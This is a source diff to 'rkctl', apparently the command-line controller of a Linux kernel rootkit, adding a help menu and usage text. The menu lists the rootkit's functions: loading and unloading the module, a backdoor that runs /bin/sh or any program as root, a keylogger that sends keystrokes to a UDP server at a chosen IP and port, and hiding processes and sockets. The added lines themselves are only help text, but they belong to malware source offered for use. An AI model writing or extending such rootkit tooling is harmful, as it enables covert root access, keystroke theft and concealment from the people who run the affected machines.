@@ -213,18 +213,39 @@ int do_socket_hiding(unsigned int request, int argc, const char *argv[]) {
 
 }
 
+void print_usage(void) {
+    printf("Usage:\n"
+           "\t ./rkctl help\t\t\t\tShow this help menu.\n"
+           "\t ./rkctl ping\t\t\t\tCheck if the rootkit is alive\n"
+           "\t ./rkctl load <module.ko>\t\tLoad the rootkit (requires root)\n"
+           "\t ./rkctl unload\t\t\t\tUnload the rootkit\n"
+           "\t ./rkctl backdoor <program>\t\tRun an arbitrary program (e.g. /bin/sh) as root\n"
+           "\t ./rkctl keylog_start <ip> <port>\tStart a keylogger that sends to a UDP server at <ip>:<port>\n"
+           "\t ./rkctl keylog_stop\t\t\tStop the current keylogger\n"
+           "\t ./rkctl hidepid_add <pid>\t\tHide a process and all its children by pid\n"
+           "\t ./rkctl hidepid_rm <pid>\t\tUnhide a process and all its non-hidden children by pid\n"
+           "\t ./rkctl hide_socket <port>\t\tHide a socket by its port\n"
+           "\t ./rkctl unhide_socket <port>\t\tUnhide a socket by its port\n\n");
+}
+
 int main(int argc, const char *argv[]) {
 
     const char *cmd;
 
     if (argc < 2) {
         printf("[-] rkctl: missing command\n");
+        print_usage();
         return -1;
     }
 
     cmd = argv[1];
 
-    if (!(strcmp(cmd, "ping"))) {
+    if (!(strcmp(cmd, "help"))) {
+
+        print_usage();
+        return 0;
+
+    } else if (!(strcmp(cmd, "ping"))) {
 
         return do_ioctl_request("ping", RKCTL_PING, NULL);
 
@@ -266,6 +287,7 @@ int main(int argc, const char *argv[]) {
 
     } else {
         printf("[-] rkctl: command not supported\n");
+        print_usage();
         return -1;
     }
 
